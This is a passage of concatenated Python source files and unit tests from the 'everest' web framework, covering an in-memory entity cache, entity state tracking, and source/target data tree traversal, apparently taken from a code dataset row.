           :method:`traverse_one` passing `None` as source (REMOVE);
        4) For all source/target data item pairs generated in 2, call
           :method:`traverse_one` (ADD or UPDATE depending on whether target
           item is `None`).

        :param source_sequence: iterable of source data proxies
        :type source_sequence: iterator yielding instances of
                               `DataTraversalProxy` or None
        :param target_sequence: iterable of target data proxies
        :type target_sequence: iterator yielding instances of
                               `DataTraversalProxy` or None
        """"""
        target_map = {}
        if not target_sequence is None:
            for target in target_sequence:
                target_map[target.get_id()] = target
        src_tgt_pairs = []
        if not source_sequence is None:
            for source in source_sequence:
                source_id = source.get_id()
                if not source_id is None:
                    # Check if target exists for UPDATE.
                    target = target_map.pop(source_id, None)
                else:
                    # Source is new, there is no target, so ADD.
                    target = None
                src_tgt_pairs.append((source, target))
        # All targets that are now still in the map where not present in the
        # source and therefore need to be REMOVEd.
        for target in itervalues_(target_map):
            if not (None, target) in self.__trv_path:
                self.traverse_one(attribute, None, target, visitor)
        #
        for source, target in src_tgt_pairs:
            if not (source, target) in self.__trv_path:
                self.traverse_one(attribute, source, target, visitor)

    def __log_run(self, visitor):
        self.__logger.debug('Traversing %s->%s with %s'
                            % (self._src_prx, self._tgt_prx, visitor))

    def __log_traverse_one(self, path, attribute, source, target):
        if target is None:
            mode = 'ADD'
            data = '%s,None' % source
        elif source is None:
            mode = 'REMOVE'
            data = 'None,%s' % target
        else:
            mode = 'UPDATE'
            data = '%s,%s' % (source, target)
        if not attribute is None:
            parent = ""(%s)"" % path.parent
            self.__logger.debug('%s%s %s.%s (%s)' %
                                (""  ""*len(path), mode, parent,
                                 attribute.resource_attr, data))
        else:
            self.__logger.debug('%s ROOT (%s)' % (mode, data))
/n/n/neverest/traversalpath.py/n/n""""""
This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Oct 16, 2013.
""""""

__docformat__ = 'reStructuredText en'
__all__ = ['TraversalPath',
           'TraversalPathNode',
           ]


class TraversalPathNode(object):
    """"""
    Value object representing a node in a traversal path.
    """"""
    def __init__(self, proxy, key, attribute, relation_operation):
        """"""
        :param proxy: Data traversal proxy for this node.
        :param attribute: Resource attribute for this node.
        :param relation_operation: Relation operation for this node. One of
          the constants defined in
          :class:`everest.constants.RELATION_OPERATIONS`.
        """"""
        self.proxy = proxy
        self.key = key
        self.attribute = attribute
        self.relation_operation = relation_operation


class TraversalPath(object):
    """"""
    Value object tracking a path taken by a data tree traverser.
    """"""
    def __init__(self, nodes=None):
        if nodes is None:
            nodes = []
        self.nodes = nodes
        self.__keys = set()

    def push(self, proxy, key, attribute, relation_operation):
        """"""
        Adds a new :class:`TraversalPathNode` constructed from the given
        arguments to this traversal path.
        """"""
        node = TraversalPathNode(proxy, key, attribute, relation_operation)
        self.nodes.append(node)
        self.__keys.add(key)

    def pop(self):
        """"""
        Removes the last traversal path node from this traversal path.
        """"""
        node = self.nodes.pop()
        self.__keys.remove(node.key)

    def __len__(self):
        return len(self.nodes)

    def __contains__(self, key):
        return key in self.__keys

    @property
    def parent(self):
        """"""
        Returns the proxy from the last node visited on the path, or `None`,
        if no node has been visited yet.
        """"""
        if len(self.nodes) > 0:
            parent = self.nodes[-1].proxy
        else:
            parent = None
        return parent

    @property
    def relation_operation(self):
        """"""
        Returns the relation operation from the last node visited on the
        path, or `None`, if no node has been visited yet.
        """"""
        if len(self.nodes) > 0:
            rel_op = self.nodes[-1].relation_operation
        else:
            rel_op = None
        return rel_op
/n/n/n",0
195,501c655e6992edbf032dfe95b9bed83fdbe649d5,"/everest/repositories/memory/cache.py/n/n""""""
Entity cache and cache map.

This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Feb 26, 2013.
""""""
from collections import defaultdict
from everest.repositories.memory.querying import MemoryQuery
from everest.repositories.state import EntityStateManager
from itertools import islice
from weakref import WeakValueDictionary

__docformat__ = 'reStructuredText en'
__all__ = ['EntityCache',
           'EntityCacheMap',
           ]


class EntityCache(object):
    """"""
    Cache for entities.

    Supports add and remove operations as well as lookup by ID and
    by slug.
    """"""
    def __init__(self, entities=None, allow_none_id=True):
        """"""
        :param bool allow_none_id: Flag specifying if calling :meth:`add`
            with an entity that does not have an ID is allowed.
        """"""
        #
        self.__allow_none_id = allow_none_id
        # List of cached entities. This is the only place we are holding a
        # real reference to the entity.
        if entities is None:
            entities = []
        self.__entities = entities
        # Dictionary mapping entity IDs to entities for fast lookup by ID.
        self.__id_map = WeakValueDictionary()
        # Dictionary mapping entity slugs to entities for fast lookup by slug.
        self.__slug_map = WeakValueDictionary()

    def get_by_id(self, entity_id):
        """"""
        Performs a lookup of an entity by its ID.

        :param int entity_id: entity ID.
        :return: entity found or ``None``.
        """"""
        return self.__id_map.get(entity_id)

    def has_id(self, entity_id):
        """"""
        Checks if this entity cache holds an entity with the given ID.

        :return: Boolean result of the check.
        """"""
        return entity_id in self.__id_map

    def get_by_slug(self, entity_slug):
        """"""
        Performs a lookup of an entity by its slug.

        :param str entity_id: entity slug.
        :return: entity found or ``None``.
        """"""
        return self.__slug_map.get(entity_slug)

    def has_slug(self, entity_slug):
        return entity_slug in self.__slug_map

    def add(self, entity):
        """"""
        Adds the given entity to this cache.

        :param entity: Entity to add.
        :type entity: Object implementing :class:`everest.interfaces.IEntity`.
        :raises ValueError: If the ID of the entity to add is ``None``.
        """"""
        # For certain use cases (e.g., staging), we do not want the entity to
        # be added to have an ID yet.
        if not entity.id is None:
            if entity.id in self.__id_map:
                raise ValueError('Duplicate entity ID ""%s"".' % entity.id)
            self.__id_map[entity.id] = entity
        elif not self.__allow_none_id:
            raise ValueError('Entity ID must not be None.')
        # The slug can be a lazy attribute depending on the
        # value of other (possibly not yet initialized) attributes which is
        # why we can not always assume it is available at this point.
        if hasattr(entity, 'slug') and not entity.slug is None:
            if entity.slug in self.__slug_map:
                raise ValueError('Duplicate entity slug ""%s"".' % entity.slug)
            self.__slug_map[entity.slug] = entity
        self.__entities.append(entity)

    def remove(self, entity):
        """"""
        Removes the given entity from this cache.

        :param entity: Entity to remove.
        :type entity: Object implementing :class:`everest.interfaces.IEntity`.
        :raises KeyError: If the given entity is not in this cache.
        :raises ValueError: If the ID of the given entity is `None`.
        """"""
        self.__id_map.pop(entity.id, None)
        self.__slug_map.pop(entity.slug, None)
        self.__entities.remove(entity)

    def replace(self, entity):
        """"""
        Replaces the current entity that has the same ID as the given new
        entity with the latter.

        :param entity: Entity to replace.
        :type entity: Object implementing :class:`everest.interfaces.IEntity`.
        :raises KeyError: If the given entity is not in this cache.
        :raises ValueError: If the ID of the given entity is `None`.
        """"""
        if entity.id is None:
            raise ValueError('Entity ID must not be None.')
        old_entity = self.__id_map[entity.id]
        self.remove(old_entity)
        self.add(entity)

    def get_all(self):
        """"""
        Returns the list of all entities in this cache in the order they
        were added.
        """"""
        return self.__entities

    def retrieve(self, filter_expression=None,
                 order_expression=None, slice_expression=None):
        """"""
        Retrieve entities from this cache, possibly after filtering, ordering
        and slicing.
        """"""
        ents = iter(self.__entities)
        if not filter_expression is None:
            ents = filter_expression(ents)
        if not order_expression is None:
            # Ordering always involves a copy and conversion to a list, so
            # we have to wrap in an iterator.
            ents = iter(order_expression(ents))
        if not slice_expression is None:
            ents = islice(ents, slice_expression.start, slice_expression.stop)
        return ents

    def __contains__(self, entity):
        if not entity.id is None:
            is_contained = entity.id in self.__id_map
        else:
            is_contained = entity in self.__entities
        return is_contained


class EntityCacheMap(object):
    """"""
    Map for entity caches.
    """"""
    def __init__(self):
        self.__cache_map = defaultdict(EntityCache)

    def __getitem__(self, entity_class):
        return self.__cache_map[entity_class]

    def get_by_id(self, entity_class, entity_id):
        cache = self.__cache_map[entity_class]
        return cache.get_by_id(entity_id)

    def get_by_slug(self, entity_class, slug):
        cache = self.__cache_map[entity_class]
        return cache.get_by_slug(slug)

    def add(self, entity_class, entity):
        cache = self.__cache_map[entity_class]
        cache.add(entity)

    def remove(self, entity_class, entity):
        cache = self.__cache_map[entity_class]
        cache.remove(entity)

    def update(self, entity_class, source_data, target_entity):
        EntityStateManager.set_state_data(entity_class,
                                          source_data, target_entity)

    def query(self, entity_class):
        return MemoryQuery(entity_class,
                           self.__cache_map[entity_class].get_all())

    def __contains__(self, entity):
        cache = self.__cache_map[type(entity)]
        return entity in cache

    def keys(self):
        return self.__cache_map.keys()
/n/n/n/everest/repositories/state.py/n/n""""""
This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Mar 14, 2013.
""""""
from everest.entities.attributes import get_domain_class_attribute_iterator
from everest.entities.attributes import get_domain_class_attribute_names
from everest.utils import get_nested_attribute
from everest.utils import set_nested_attribute
from pyramid.compat import iteritems_
from weakref import ref

__docformat__ = 'reStructuredText en'
__all__ = ['ENTITY_STATES',
           'EntityStateManager',
           ]


class ENTITY_STATES(object):
    """"""
    Entity state flags.
    """"""
    CLEAN = 'CLEAN'
    NEW = 'NEW'
    DELETED = 'DELETED'
    DIRTY = 'DIRTY'


class EntityStateManager(object):
    """"""
    Manager for entity state and state data.

    Initially, an object is marked as NEW (freshly instantiated) or CLEAN
    (freshly fetched from repository).

    Only a weak reference to the tracked object is stored to avoid circular
    references.

    Not all state transitions are allowed.
    """"""
    # FIXME: Need a proper state diagram here or drop tracking alltogether.
    __allowed_transitions = set([(None, ENTITY_STATES.NEW),
                                 (None, ENTITY_STATES.CLEAN),
                                 (None, ENTITY_STATES.DELETED),
                                 (ENTITY_STATES.NEW, ENTITY_STATES.CLEAN),
                                 (ENTITY_STATES.NEW, ENTITY_STATES.DELETED),
                                 (ENTITY_STATES.DELETED, ENTITY_STATES.CLEAN),
                                 (ENTITY_STATES.DELETED, ENTITY_STATES.NEW),
                                 (ENTITY_STATES.CLEAN, ENTITY_STATES.DIRTY),
                                 (ENTITY_STATES.CLEAN, ENTITY_STATES.DELETED),
                                 (ENTITY_STATES.CLEAN, ENTITY_STATES.NEW),
                                 (ENTITY_STATES.DIRTY, ENTITY_STATES.CLEAN),
                                 (ENTITY_STATES.DIRTY, ENTITY_STATES.DELETED),
                                 ])

    def __init__(self, entity_class, entity, unit_of_work):
        self.__entity_class = entity_class
        self.__obj_ref = ref(entity)
        self.__uow_ref = ref(unit_of_work)
        self.__state = None
        self.__last_state = self.get_state_data(entity_class, entity)

    @classmethod
    def manage(cls, entity_class, entity, unit_of_work):
        """"""
        Manages the given entity under the given Unit Of Work.

        If `entity` is already managed by the given Unit Of Work, nothing
        is done.

        :raises ValueError: If the given entity is already under management
          by a different Unit Of Work.
        """"""
        if hasattr(entity, '__everest__'):
            if not unit_of_work is entity.__everest__.unit_of_work:
                raise ValueError('Trying to register an entity that has been '
                                 'registered with another session!')
        else:
            entity.__everest__ = cls(entity_class, entity, unit_of_work)

    @classmethod
    def release(cls, entity, unit_of_work):
        """"""
        Releases the given entity from management under the given Unit Of
        Work.

        :raises ValueError: If `entity` is not managed at all or is not
          managed by the given Unit Of Work.
        """"""
        if not hasattr(entity, '__everest__'):
            raise ValueError('Trying to unregister an entity that has not '
                             'been registered yet!')
        elif not unit_of_work is entity.__everest__.unit_of_work:
            raise ValueError('Trying to unregister an entity that has been '
                             'registered with another session!')
        delattr(entity, '__everest__')

    @classmethod
    def set_state(cls, entity, state):
        """"""
        Sets the state flag of the given entity to the given value.

        :raises ValueError: If `entity` is not managed.
        """"""
        if not hasattr(entity, '__everest__'):
            raise ValueError('Trying to mark an unregistered entity as '
                             '%s!' % state)
        entity.__everest__.state = state

    @classmethod
    def get_state(cls, entity):
        """"""
        Returns the state flag of the given entity.

        :raises ValueError: If `entity` is not managed.
        """"""
        if not hasattr(entity, '__everest__'):
            raise ValueError('Trying to get the state of an unregistered '
                             'entity!')
        return entity.__everest__.state

    @classmethod
    def transfer_state_data(cls, entity_class, source_entity, target_entity):
        """"""
        Transfers instance state data from the given source entity to the
        given target entity.
        """"""
        state = cls.get_state_data(entity_class, source_entity)
        cls.set_state_data(entity_class, state, target_entity)

    @classmethod
    def get_state_data(cls, entity_class, entity):
        """"""
        Returns state data for the given entity of the given class.

        :param entity: Entity to obtain the state data from.
        :returns: Dictionary mapping attributes to attribute values.
        """"""
        attrs = get_domain_class_attribute_iterator(entity_class)
        return dict([(attr,
                      get_nested_attribute(entity, attr.entity_attr))
                     for attr in attrs])

    @classmethod
    def set_state_data(cls, entity_class, data, entity):
        """"""
        Sets the given state data on the given entity of the given class.

        :param data: State data to set.
        :type data: Dictionary mapping attributes to attribute values.
        :param entity: Entity to receive the state data.
        """"""
        attr_names = get_domain_class_attribute_names(entity_class)
        nested_items = []
        for attr, new_attr_value in iteritems_(data):
            if not attr.entity_attr in attr_names:
                raise ValueError('Can not set attribute ""%s"" for entity '
                                 '""%s"".' % (attr.entity_attr, entity_class))
            if '.' in attr.entity_attr:
                nested_items.append((attr, new_attr_value))
                continue
            else:
                setattr(entity, attr.entity_attr, new_attr_value)
        for attr, new_attr_value in nested_items:
            try:
                set_nested_attribute(entity, attr.entity_attr, new_attr_value)
            except AttributeError, exc:
                if not new_attr_value is None:
                    raise exc

    def __get_state(self):
        state = self.__state
        if state == ENTITY_STATES.CLEAN:
            if self.get_state_data(self.__entity_class, self.__obj_ref()) \
               != self.__last_state:
                state = ENTITY_STATES.DIRTY
        return state

    def __set_state(self, state):
        if not (self.__get_state(), state) in self.__allowed_transitions:
            raise ValueError('Invalid state transition %s -> %s.'
                             % (self.__state, state))
        self.__state = state
        if state == ENTITY_STATES.CLEAN:
            self.__last_state = self.get_state_data(self.__entity_class,
                                                    self.__obj_ref())

    #: The current state. One of the `ENTITY_STATES` constants.
    state = property(__get_state, __set_state)

    @property
    def unit_of_work(self):
        return self.__uow_ref()

/n/n/n/everest/tests/test_memory_cache.py/n/n""""""
This file is part of the everest project. 
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Apr 13, 2013.
""""""
from everest.entities.base import Entity
from everest.querying.interfaces import IFilterSpecificationFactory
from everest.querying.interfaces import IOrderSpecificationFactory
from everest.querying.specifications import FilterSpecificationFactory
from everest.querying.specifications import OrderSpecificationFactory
from everest.querying.specifications import asc
from everest.querying.specifications import eq
from everest.repositories.memory.cache import EntityCache
from everest.repositories.memory.querying import EvalFilterExpression
from everest.repositories.memory.querying import EvalOrderExpression
from everest.testing import Pep8CompliantTestCase
from pyramid.threadlocal import get_current_registry
from everest.repositories.memory.cache import EntityCacheMap

__docformat__ = 'reStructuredText en'
__all__ = ['EntityCacheTestCase',
           'EntityCacheMapTestCase',
           ]


class EntityCacheTestCase(Pep8CompliantTestCase):
    def set_up(self):
        Pep8CompliantTestCase.set_up(self)
        # Some tests require the filter and order specification factories.
        flt_spec_fac = FilterSpecificationFactory()
        ord_spec_fac = OrderSpecificationFactory()
        reg = get_current_registry()
        reg.registerUtility(flt_spec_fac, IFilterSpecificationFactory)
        reg.registerUtility(ord_spec_fac, IOrderSpecificationFactory)

    def test_basics(self):
        ent = MyEntity(id=0)
        cache = EntityCache(entities=[])
        cache.add(ent)
        self.assert_true(cache.get_by_id(ent.id) is ent)
        self.assert_true(cache.has_id(ent.id))
        self.assert_true(cache.get_by_slug(ent.slug) is ent)
        self.assert_true(cache.has_slug(ent.slug))
        ent1 = MyEntity(id=0)
        txt = 'FROBNIC'
        ent1.text = txt
        cache.replace(ent1)
        self.assert_equal(cache.get_by_id(ent.id).text, txt)
        self.assert_equal(cache.get_all(), [ent])
        self.assert_equal(list(cache.retrieve()), [ent])
        cache.remove(ent)
        self.assert_is_none(cache.get_by_id(ent.id))
        self.assert_is_none(cache.get_by_slug(ent.slug))

    def test_filter_order_slice(self):
        ent0 = MyEntity(id=0)
        ent1 = MyEntity(id=1)
        ent2 = MyEntity(id=2)
        cache = EntityCache(entities=[])
        cache.add(ent0)
        cache.add(ent1)
        cache.add(ent2)
        filter_expr = EvalFilterExpression(~eq(id=0))
        order_expr = EvalOrderExpression(asc('id'))
        slice_expr = slice(1, 2)
        self.assert_equal(list(cache.retrieve(filter_expression=filter_expr,
                                              order_expression=order_expr,
                                              slice_expression=slice_expr)),
                          [ent2])

    def test_allow_none_id_false(self):
        ent = MyEntity()
        cache = EntityCache(entities=[], allow_none_id=False)
        self.assert_raises(ValueError, cache.add, ent)


class EntityCacheMapTestCase(Pep8CompliantTestCase):
    def test_basics(self):
        ecm = EntityCacheMap()
        ent = MyEntity(id=0)
        ecm.add(MyEntity, ent)
        self.assert_equal(ecm[MyEntity].get_by_id(0), ent)
        self.assert_true(ent in ecm)
        self.assert_equal(ecm.keys(), [MyEntity])
        ecm.remove(MyEntity, ent)
        self.assert_false(ent in ecm)


class MyEntity(Entity):
    text = None

/n/n/n/everest/tests/test_traversalpath.py/n/n""""""
This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Oct 21, 2013.
""""""
from everest.testing import Pep8CompliantTestCase
from everest.traversalpath import TraversalPath

__docformat__ = 'reStructuredText en'
__all__ = ['TraversalPathTestCase',
           ]


class TraversalPathTestCase(Pep8CompliantTestCase):
    def test_basics(self):
        tp = TraversalPath()
        self.assert_equal(len(tp), 0)
        self.assert_is_none(tp.parent)
        self.assert_is_none(tp.relation_operation)
        parent = 'proxy'
        rel_op = 'relation_operation'
        tp.push(parent, 'attribute', rel_op)
        self.assert_equal(len(tp), 1)
        self.assert_equal(tp.parent, parent)
        self.assert_equal(tp.relation_operation, rel_op)
        tp1 = tp.clone()
        tp.pop()
        self.assert_equal(len(tp), 0)
        self.assert_equal(len(tp1), 1)
/n/n/n/everest/traversal.py/n/n""""""
Custom resource object tree traverser.

This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Feb 4, 2011.
""""""
from collections import MutableSequence
from collections import MutableSet
from everest.attributes import get_attribute_cardinality
from everest.attributes import is_terminal_attribute
from everest.constants import CARDINALITY_CONSTANTS
from everest.constants import RELATION_OPERATIONS
from everest.constants import RESOURCE_ATTRIBUTE_KINDS
from everest.constants import RESOURCE_KINDS
from everest.interfaces import IDataTraversalProxyAdapter
from everest.interfaces import IDataTraversalProxyFactory
from everest.resources.interfaces import IResource
from everest.traversalpath import TraversalPath
from logging import getLogger as get_logger
from pyramid.compat import itervalues_
from pyramid.threadlocal import get_current_registry
from pyramid.traversal import ResourceTreeTraverser
from zope.interface import implementer # pylint: disable=E0611,F0401
#from everest.resources.staging import create_staging_collection

__docformat__ = 'reStructuredText en'
__all__ = ['ConvertingDataTraversalProxyMixin',
           'DataSequenceTraversalProxy',
           'DataTraversalProxy',
           'DataTraversalProxyAdapter',
           'DataTraversalProxyFactory',
           'SourceTargetDataTreeTraverser',
           'SuffixResourceTraverser',
           ]


class SuffixResourceTraverser(ResourceTreeTraverser):
    """"""
    A custom resource tree traverser that allows us to specify the
    representation for resources with a suffix as in
    `http://everest/myobjects.csv`.

    Rather than to reproduce the functionality of the `__call__` method, we
    check if base part of the current view name (`myobjects` in the example)
    can be retrieved as a child resource from the context. If yes, we set the
    context to the resource and the view name to the extension part of the
    current view name (`csv` in the example); if no, nothing is changed.
    """"""
    def __call__(self, request):
        system = ResourceTreeTraverser.__call__(self, request)
        context = system['context']
        view_name = system['view_name']
        if IResource.providedBy(context) and '.' in view_name: # pylint: disable=E1101
            rc_name, repr_name = view_name.split('.')
            try:
                child_rc = context[rc_name]
            except KeyError:
                pass
            else:
                if IResource.providedBy(child_rc): # pylint: disable=E1101
                    system['context'] = child_rc
                    system['view_name'] = repr_name
        return system


class DataSequenceTraversalProxy(object):
    """"""
    Simple wrapper for a sequence of data traversal proxies.
    """"""
    #: Constant indicating that this proxy is for collection resource data.
    proxy_for = RESOURCE_KINDS.COLLECTION

    def __init__(self, proxies):
        self.__proxies = proxies

    def __iter__(self):
        return iter(self.__proxies)


class DataTraversalProxy(object):
    """"""
    Abstract base class for data tree traversal proxies.

    By providing a uniform interface to the nodes of data trees
    encountered during tree traversal, this proxy makes it possible to use
    different data structures as source or target for the traversal.
    """"""
    #: Constant indicating that this proxy is for member resource data.
    proxy_for = RESOURCE_KINDS.MEMBER

    def __init__(self, data, accessor, relationship_direction):
        """"""
        :param data: root of the data tree to traverse.
        :param relationship_direction: constant indicating which relation
          direction(s) to consider for managing references.
        """"""
        super(DataTraversalProxy, self).__init__()
        self.relationship_direction = relationship_direction
        self._data = data
        self._accessor = accessor
        self._relationships = {}

    def get_relationship_attributes(self):
        """"""
        Returns an iterator over the relationship attributes (i.e.,
        non-terminal attributes) of the proxied data.

        :returns: iterator yielding objects implementing
          :class:`everest.resources.interfaces.IResourceAttribute`.
        """"""
        for attr in self._attribute_iterator():
            if not is_terminal_attribute(attr):
                yield attr

    def get_matching(self, source_id):
        """"""
        Returns a matching target object for the given source ID.
        """"""
        value = self._accessor.get_by_id(source_id)
        if not value is None:
            reg = get_current_registry()
            prx_fac = reg.getUtility(IDataTraversalProxyFactory)
            prx = prx_fac.make_proxy(value,
                                     self._accessor,
                                     self.relationship_direction)
        else:
            prx = None
        return prx

    @property
    def update_attribute_value_items(self):
        """"""
        Returns an iterator of items for an attribute value map to use for
        an UPDATE operation.

        The iterator ignores collection attributes as these are processed
        implicitly by the traversal algorithm.

        :returns: iterator yielding tuples with objects implementing
          :class:`everest.resources.interfaces.IResourceAttribute` as the
          first and the proxied attribute value as the second argument.
        """"""
        for attr in self._attribute_iterator():
            if attr.kind != RESOURCE_ATTRIBUTE_KINDS.COLLECTION:
                try:
                    attr_val = self._get_proxied_attribute_value(attr)
                except AttributeError:
                    continue
                else:
                    yield (attr, attr_val)

    def set_relationship(self, attribute, relationship):
        """"""
        Sets the given domain relationship object for the given resource
        attribute.
        """"""
        self._relationships[attribute.entity_attr] = relationship

    def get_relationship(self, attribute):
        """"""
        Returns the domain relationship object for the given resource
        attribute.
        """"""
        return self._relationships[attribute.entity_attr]

    def get_attribute_proxy(self, attribute):
        """"""
        Returns a traversal proxy (cardinality ONE) or an iterable sequence
        data traversal proxy (cardinality MANY) for the specified relation
        attribute value of the proxied data.

        :raises ValueError: If :param:`attribute` is a terminal attribute.
        """"""
        attr_val = self._get_relation_attribute_value(attribute)
        if attr_val is None:
            prx = None
        else:
            if not self._accessor is None:
                acc = self._make_accessor(attribute.attr_type)
            else:
                acc = None
            reg = get_current_registry()
            prx_fac = reg.getUtility(IDataTraversalProxyFactory)
            prx = prx_fac.make_proxy(attr_val, acc,
                                     self.relationship_direction,
                                     options=
                                        self._get_proxy_options(attribute))
        return prx

    def do_traverse(self):
        """"""
        Checks if this proxy should be traversed.
        """"""
        return True

    def _get_proxy_options(self, attribute): # pylint:disable=W0613
        """"""
        Returns custom constructor options to pass to new proxies constructed
        from this one through :method:`get_attribute_proxy`. This default
        implementation returns an emtpy dictionary.
        """"""
        return {}

    def _get_relatee(self, attribute):
        """"""
        Returns the relatee for the given relation attribute.

        :raises AttributeError: If no relatee for the given attribute has
          been set.
        """"""
        try:
            rel = self._relationships[attribute.entity_attr]
        except KeyError:
            raise AttributeError(attribute)
        else:
            return rel.relatee

    def get_id(self):
        """"""
        Returns the ID of the proxied data.

        :returns: Numeric or string ID.
        """"""
        raise NotImplementedError('Abstract method.')

    def _get_entity_type(self):
        """"""
        Returns the entity type of the proxied data.

        :returns: Type object (subclass of
          :class:`everest.entities.base.Entity`)
        """"""
        raise NotImplementedError('Abstract method.')

    def get_entity(self):
        """"""
        Returns the proxied data as a domain object.

        :returns: Instance of :class:`everest.entities.base.Entity`.
        """"""
        raise NotImplementedError('Abstract method.')

    def _attribute_iterator(self):
        """"""
        Returns an iterator over all proxied resource attributes.
        """"""
        raise NotImplementedError('Abstract method.')

    def _get_relation_attribute_value(self, attribute):
        """"""
        Returns the value for the given relation attribute from the proxied
        data. Depending on the implementation, a sequence of data items may
        be returned for attributes of cardinality MANY.
        """"""
        raise NotImplementedError('Abstract method.')

    def _get_proxied_attribute_value(self, attribute):
        """"""
        Returns the value for the given attribute from the proxied data.

        :raises AttributeError: If the proxied data do not have the specified
          attribute.
        """"""
        raise NotImplementedError('Abstract method.')

    def _make_accessor(self, value_type):
        """"""
        Creates a new target accessor for the given value.
        """"""
        raise NotImplementedError('Abstract method.')

    def __str__(self):
        return ""%s(id=%s)"" % (self._data.__class__.__name__, self.get_id())

    def __hash__(self):
        """"""
        The hash value is built either from the ID and the entity type of
        the proxied data or, if the ID is None, from the runtime object
        ID.
        """"""
        data_id = self.get_id()
        return data_id is None and id(self._data) \
               or hash((self._get_entity_type(), data_id))

    def __eq__(self, other):
        """"""
        Equality is determined by comparing hash values.
        """"""
        return self.__hash__() == hash(other)


@implementer(IDataTraversalProxyFactory)
class DataTraversalProxyFactory(object):
    """"""
    Factory for data traversal proxies.
    """"""
    def make_source_proxy(self, data, options=None):
        """"""
        Returns a data traversal proxy for the given source data.

        This is a convenience factory function to use when manually setting
        up a data traversal proxy for source data.

        :raises ValueError: If there is no adapter for the given traversal
          data and the data is not iterable.
        """"""
        return self.__make_proxy('make_source_proxy', data, (),
                                 dict(options=options))

    def make_target_proxy(self, data, accessor, manage_back_references=True,
                          options=None):
        """"""
        Returns a data traversal proxy for the given target data.

        This is a convenience factory function to use when manually setting
        up a data traversal proxy for target data.

        :raises ValueError: If there is no adapter for the given traversal
          data and the data is not iterable.
        """"""
        return self.__make_proxy('make_target_proxy', data, (accessor,),
                                 dict(manage_back_references=
                                            manage_back_references,
                                      options=options))

    def make_proxy(self, data, accessor, relationship_direction,
                   options=None):
        """"""
        Returns a data traversal proxy for the given data.

        This is the generic factory function that can be used to create
        both source and target data traversal proxies.

        :raises ValueError: If there is no adapter for the given traversal
          data and the data is not iterable.
        """"""
        return self.__make_proxy('make_proxy', data,
                                 (accessor, relationship_direction),
                                 dict(options=options))

    def __make_proxy(self, method_name, data, args, options):
        # We first check if we have a registered adapter for the given data;
        # if not, we assume it is a mutable sequence or set; if that fails,
        # we raise a ValueError.
        reg = get_current_registry()
        adp = reg.queryAdapter(data, IDataTraversalProxyAdapter)
        if not adp is None:
            prx = getattr(adp, method_name)(*args, **options)
        else:
            if not isinstance(data, (MutableSequence, MutableSet)):
                # Assuming an iterable is not enough here.
                raise ValueError('Invalid data type for traversal: %s.'
                                 % type(data))
            else:
                prxs = []
                for item in data:
                    adp = reg.queryAdapter(item, IDataTraversalProxyAdapter)
                    if adp is None:
                        raise ValueError('Invalid data type for traversal: '
                                         '%s.' % type(item))
                    prx = getattr(adp, method_name)(*args, **options)
                    prxs.append(prx)
                prx = DataSequenceTraversalProxy(prxs)
        return prx


@implementer(IDataTraversalProxyAdapter)
class DataTraversalProxyAdapter(object):
    """"""
    Abstract base class for data traversal proxy adapters.

    The adapters are used for dispatching a new data traversal proxy based
    on a resource data tree node's value.
    """"""
    #: The data traversal proxy class used by this factory.
    proxy_class = lambda *args: None

    def __init__(self, data):
        self._data = data

    def make_source_proxy(self, options=None):
        """"""
        Returns a data traversal proxy for the adapted data.
        """"""
        raise NotImplementedError('Abstract method.')

    def make_target_proxy(self, accessor, manage_back_references=True,
                          options=None):
        """"""
        Returns a data traversal proxy for the adapted data.
        """"""
        raise NotImplementedError('Abstract method.')

    def make_proxy(self, accessor, relationship_direction, options=None):
        """"""
        Returns a data traversal proxy for the adapted data.
        """"""
        if options is None:
            options = {}
        return self.proxy_class(self._data, accessor,
                                   relationship_direction, **options)


class ConvertingDataTraversalProxyMixin(object):
    """"""
    Mixin class for data traversal proxies that convert incoming
    representation data to an entity.
    """"""
    __converted_entity = None

    def get_entity(self):
        """"""
        Returns the entity converted from the proxied data.
        """"""
        if self._accessor is None:
            if self.__converted_entity is None:
                self.__converted_entity = self._convert_to_entity()
        else:
            # If we have an accessor, we can get the proxied entity by ID.
            # FIXME: This is a hack that is only used for REMOVE operations
            #        with data elements.
            self.__converted_entity = \
                self.get_matching(self.get_id()).get_entity()
        return self.__converted_entity

    def _convert_to_entity(self):
        raise NotImplementedError('Abstract method.')


class SourceTargetDataTreeTraverser(object):
    """"""
    Traverser for synchronous traversal of a source and a target data tree.

    For each data item pair, starting with the root of the source and target
    data tree, iterate over the non-terminal attributes of the associated type
    and obtain the attribute value (child data item) for both the source and
    the target. If the parent source or target data item is `None`, the
    corresponding child data item is also `None`.

    A child node is traversed along the ADD cascade when only the source
    was found, along the REMOVE cascade when only the target was found, and
    along the UPDATE cascade when both source and target were found. Traversal
    is suppressed when the parent attribute does not have the appropriate
    cascading flag set.

    When traversing along the ADD cascade, a child node of a node that is
    being added is only traversed (along the ADD cascade) when it has no ID
    (i.e., ID is None).

    When traversing along the REMOVE cascade, a child node of a node that is
    being removed is also removed if it has an ID (i.e., the ""id"" attribute
    is not None).
    """"""
    def __init__(self, source_proxy, target_proxy):
        self._src_prx = source_proxy
        self._tgt_prx = target_proxy
        self.__traversed = set()
        self.__root_is_sequence = \
            (not source_proxy is None and
             source_proxy.proxy_for == RESOURCE_KINDS.COLLECTION) \
            or (not target_proxy is None and
                target_proxy.proxy_for == RESOURCE_KINDS.COLLECTION)
        if __debug__:
            self.__logger = get_logger('everest')
        else:
            self.__logger = None

    @classmethod
    def make_traverser(cls, source_data, target_data, relation_operation,
                       accessor=None, manage_back_references=True,
                       source_proxy_options=None, target_proxy_options=None):
        """"""
        Factory method to create a tree traverser depending on the input
        source and target data combination.

        :param source_data: Source data.
        :param target_target: Target data.
        :param str relation_operation: Relation operation. On of the constants
          defined in :class:`everest.constants.RELATION_OPERATIONS`.
        :param accessor: Accessor for looking up target nodes for update
          operations.
        :param bool manage_back_references: Flag passed to the target proxy.
        """"""
        reg = get_current_registry()
        prx_fac = reg.getUtility(IDataTraversalProxyFactory)
        if relation_operation == RELATION_OPERATIONS.ADD \
           or relation_operation == RELATION_OPERATIONS.UPDATE:
